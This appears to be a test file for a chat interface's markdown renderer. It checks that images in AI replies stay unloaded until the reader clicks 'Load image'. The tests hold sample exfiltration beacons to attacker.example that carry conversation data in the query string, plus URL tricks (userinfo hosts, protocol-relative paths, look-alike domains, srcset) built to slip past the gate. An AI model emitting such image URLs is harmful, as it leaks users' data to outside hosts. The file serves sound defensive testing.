import { cleanup, render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { afterEach, describe, expect, it, vi } from 'vitest';

vi.mock('../MermaidDiagram', () => ({
  MermaidDiagram: ({ source }: { source: string }) => <pre>{source}</pre>,
}));

vi.mock('../HighlightedCode', () => ({
  HighlightedCode: ({ code }: { code: string }) => <>{code}</>,
}));

const { MarkdownContent } = await import('../MarkdownContent');
const { StreamingMarkdownContent } = await import('../StreamingMarkdownContent');

const ATTACKER_HOST = 'attacker.example';
const FETCHING_ELEMENTS = 'img, picture, source, image, video, audio, iframe, object, embed, link';
const FETCHING_ATTRIBUTES = ['src', 'srcset', 'href', 'xlink:href', 'poster', 'data', 'style'];
const PNG_DATA_URL = 'data:image/png;base64,iVBORw0KGgo=';

afterEach(cleanup);

function referencesUrl(container: HTMLElement, url: string): boolean {
  return [container, ...container.querySelectorAll('*')].some((element) =>
    FETCHING_ATTRIBUTES.some((name) => element.getAttribute(name)?.includes(url)),
  );
}

function expectNoRequestTo(container: HTMLElement, url: string): void {
  expect(container.querySelector(FETCHING_ELEMENTS)).toBeNull();
  expect(referencesUrl(container, url)).toBe(false);
}

function imageSources(container: HTMLElement): (string | null)[] {
  return [...container.querySelectorAll('img')].map((image) => image.getAttribute('src'));
}

describe('MarkdownContent images', () => {
  it('fetches nothing for an attacker image in a reply until the reader clicks Load image', async () => {
    const user = userEvent.setup();
    const url = `https://${ATTACKER_HOST}/p?d=summary-of-the-conversation`;
    const { container } = render(
      <MarkdownContent content={`Here is the summary.\n\n![chart](${url})`} />,
    );

    expectNoRequestTo(container, `${ATTACKER_HOST}/p`);
    expect(screen.getByText(`Image from ${ATTACKER_HOST}`)).toBeTruthy();

    await user.click(screen.getByRole('button', { name: `Load image from ${ATTACKER_HOST}` }));

    const image = container.querySelector('img');
    expect(image?.getAttribute('src')).toBe(url);
    expect(image?.getAttribute('referrerpolicy')).toBe('no-referrer');
    expect(image?.getAttribute('alt')).toBe('chart');
  });

  it('gates raw html, reference-style and streamed images the same way', () => {
    const url = `https://${ATTACKER_HOST}/r.png?d=secret`;
    const { container } = render(
      <>
        <MarkdownContent content={`<img src="${url}" alt="raw">`} />
        <MarkdownContent content={`![ref][r]\n\n[r]: ${url}`} />
        <StreamingMarkdownContent content={`Streaming ![s](${url})`} isStreaming />
      </>,
    );

    expectNoRequestTo(container, `${ATTACKER_HOST}/r.png`);
    expect(
      screen.getAllByRole('button', { name: `Load image from ${ATTACKER_HOST}` }),
    ).toHaveLength(3);
  });

  it('renders an image whose exact URL came from the turn search results', () => {
    const url = 'https://upload.wikimedia.org/wikipedia/commons/a/a8/Tour_Eiffel.jpg';
    const { container } = render(
      <>
        <MarkdownContent content={`![Eiffel Tower](${url})`} trustedImageUrls={[url]} />
        <StreamingMarkdownContent
          content={`![Eiffel Tower](${url}#view)`}
          trustedImageUrls={[url]}
          isStreaming
        />
      </>,
    );

    expect(imageSources(container)).toEqual([url, `${url}#view`]);
    expect(screen.queryByRole('button', { name: /Load image/ })).toBeNull();
  });

  it('does not let a search result vouch for other URLs on its host', () => {
    const trusted = 'https://news.example/article';
    const { container } = render(
      <MarkdownContent
        content="![beacon](https://news.example/beacon.png?d=secret)"
        trustedImageUrls={[trusted]}
      />,
    );

    expectNoRequestTo(container, 'news.example/beacon.png');
    expect(screen.getByRole('button', { name: 'Load image from news.example' })).toBeTruthy();
  });

  it('renders generated files, uploads and inline data without asking', () => {
    const generated = '/api/files/0f8c2f6e-1d2b-4e5f-8a9b-0c1d2e3f4a5b';
    const upload = 'blob:https://agiworkforce.com/7c1e9d1a-3b9f-4f77-9a43-2d8b3f0f6a10';
    const { container } = render(
      <MarkdownContent
        content={[
          `![Generated image](<${generated}>)`,
          `![Uploaded photo](${upload})`,
          `![Inline chart](${PNG_DATA_URL})`,
        ].join('\n\n')}
      />,
    );

    expect(imageSources(container)).toEqual([generated, upload, PNG_DATA_URL]);
    expect(screen.queryByRole('button', { name: /Load image/ })).toBeNull();
    expect(container.querySelector('img')?.hasAttribute('referrerpolicy')).toBe(false);
  });

  it('loads the image from the keyboard and moves focus onto it', async () => {
    const user = userEvent.setup();
    const url = `https://${ATTACKER_HOST}/keyboard.png`;
    const { container } = render(<MarkdownContent content={`![keyboard](${url})`} />);

    await user.tab();
    const button = screen.getByRole('button', { name: `Load image from ${ATTACKER_HOST}` });
    expect(document.activeElement).toBe(button);

    await user.keyboard('{Enter}');

    expect(container.querySelector('img')?.getAttribute('src')).toBe(url);
    expect(document.activeElement).toBe(
      screen.getByRole('link', { name: 'Open image in a new tab: keyboard' }),
    );
  });

  it.each([
    ['userinfo before the real host', `https://upload.wikimedia.org@${ATTACKER_HOST}/u.png`],
    ['a protocol-relative source', `//${ATTACKER_HOST}/pr.png`],
    ['a backslash protocol-relative source', `/\\${ATTACKER_HOST}/bs.png`],
    ['a scheme without slashes', `https:${ATTACKER_HOST}/ns.png`],
    ['an uppercase host', `https://${ATTACKER_HOST.toUpperCase()}/uc.png`],
  ])('treats %s as the host it really reaches', (_label, source) => {
    const { container } = render(
      <MarkdownContent
        content={`<img src="${source}" alt="x">`}
        trustedImageUrls={['https://upload.wikimedia.org/u.png']}
      />,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('button', { name: `Load image from ${ATTACKER_HOST}` })).toBeTruthy();
  });

  it('never fetches a source whose uppercase scheme the sanitizer refuses', () => {
    const { container } = render(
      <MarkdownContent
        content={`<img src="HTTPS://${ATTACKER_HOST.toUpperCase()}/x.png" alt="x">`}
      />,
    );

    expectNoRequestTo(container, '/x.png');
  });

  it('shows a look-alike IDN host in punycode and does not match it to the trusted host', () => {
    const trusted = 'https://example.com/logo.png';
    const lookAlike = 'https://exаmple.com/logo.png';
    const punycodeHost = new URL(lookAlike).host;
    const { container } = render(
      <MarkdownContent content={`![logo](${lookAlike})`} trustedImageUrls={[trusted]} />,
    );

    expect(punycodeHost).toMatch(/^xn--/);
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText(`Image from ${punycodeHost}`)).toBeTruthy();
  });

  it('keeps a linked image inert inside its link instead of nesting a button', () => {
    const { container } = render(
      <MarkdownContent
        content={`[![build](https://${ATTACKER_HOST}/badge.svg)](https://github.com/example/repo)`}
      />,
    );

    const link = screen.getByRole('link');
    expect(link.getAttribute('href')).toBe('https://github.com/example/repo');
    expect(link.textContent).toContain(`Image from ${ATTACKER_HOST}`);
    expect(screen.queryByRole('button')).toBeNull();
    expectNoRequestTo(container, `${ATTACKER_HOST}/badge.svg`);
  });

  it('drops a responsive source that would bypass the image gate', () => {
    const { container } = render(
      <MarkdownContent
        content={`<picture><source srcset="https://${ATTACKER_HOST}/s.png"><img src="${PNG_DATA_URL}" alt="pic"></picture>`}
      />,
    );

    expect(container.querySelector('picture, source')).toBeNull();
    expect(referencesUrl(container, `${ATTACKER_HOST}/s.png`)).toBe(false);
    expect(imageSources(container)).toEqual([PNG_DATA_URL]);
  });
});
